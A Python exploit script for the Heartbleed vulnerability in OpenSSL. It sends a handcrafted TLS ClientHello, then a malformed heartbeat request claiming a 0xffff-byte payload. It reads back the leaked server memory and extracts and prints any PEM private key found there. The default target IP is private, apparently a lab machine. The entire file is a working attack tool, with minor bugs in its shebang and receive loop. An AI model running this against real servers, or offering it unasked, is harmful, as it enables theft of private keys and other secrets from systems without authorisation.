#! /usr/bin env python3

import socket
import struct
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="ip", help="Host IP", default="10.0.23.19")
    options = parser.parse_args()
    return options

client_hello = bytes.fromhex((
    # TLS header:
    "16"                        # Content type (0x16 for handshake)
    "03 02"                     # TLS Version
    "00 9c"                     # Length
    # Handshake header:
    "01"                        # Type (0x01 for client hello)
    "00 00 98"                  # Length
    "03 02"                     # TLS Version
    # Random:
    "53 43 5b 90 9d 9b 72 0b"
    "bc 0c bc 2b 92 a8 48 97"
    "cf bd 39 04 cc 16 0a 85"
    "03 90 9f 77 04 33 d4 de"
    "00"                        # Session ID length
    "00 66"                     # Cipher suites length
    # Cipher suites:
    "c0 14 c0 0a c0 22 c0 21"
    "00 39 00 38 00 88 00 87"
    "c0 0f c0 05 00 35 00 84"
    "c0 12 c0 08 c0 1c c0 1b"
    "00 16 00 13 c0 0d c0 03"
    "00 0a c0 13 c0 09 c0 1f"
    "c0 1e 00 33 00 32 00 9a"
    "00 99 00 45 00 44 c0 0e"
    "c0 04 00 2f 00 96 00 41"
    "c0 11 c0 07 c0 0c c0 02"
    "00 05 00 04 00 15 00 12"
    "00 09 00 14 00 11 00 08"
    "00 06 00 03 00 ff"
    "01"                        # Compression methods length
    # Compression methods:
    "00"
    "00 09"                     # Extensions length
    # Extensions:
    "00 23 00 00"               # SessionTicket TLS
    "00 0f 00 01 01"            # Heartbeat
).replace(' ', ''))

heartbeat = bytes.fromhex((
    "18"                        # Content type (Heartbeat)
    "03 02"                     # TLS version
    "00 03"                     # Length
    "01"                        # Type (Req)
    "ff ff"                     # Payload Length
).replace(' ', ''))

# Receive the whole message, even if it is splitted:
def recvall(sock, lgth):
    msg = b''

    while lgth > 0:
        msg += sock.recv(lgth)
        lgth -= len(msg)

    return msg

# Receive a TLS message:
def recvTLS(sock):
    # Receive TLS header (5 bytes):
    header = recvall(sock, 5)

    contentType, version, length = struct.unpack(">BHH", header)

    # Receive payload:
    payload = recvall(sock, length)

    return contentType, version, payload

if __name__ == "__main__":
    options = get_arguments()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect((options.ip, 443))

    # Send Client Hello:
    sock.send(client_hello)

    # Receive all handshake packets:
    payload = " "
    while payload[0] != 0x0E:
        contentType, version, payload = recvTLS(sock)

    # Send malicious heartbeat:
    sock.send(heartbeat)

    # Receive all packets:
    contentType = 0
    payload = b''
    while contentType != 24:
        contentType, version, payload_tmp = recvTLS(sock)
        payload += payload_tmp

    key_header = b'-----BEGIN PRIVATE KEY-----'
    key_footer = b'-----END PRIVATE KEY-----'

    # Get actual key start index:
    key_start = payload.find(key_header) + len(key_header)

    key_len = payload.find(key_footer) - key_start

    key = payload[key_start:key_start+key_len]

    # Standard PEM formatting:
    print(key_header.decode())
    print("\n".join(key.decode()[n:n+64] for n in range(0, key_len, 64)))
    print(key_footer.decode())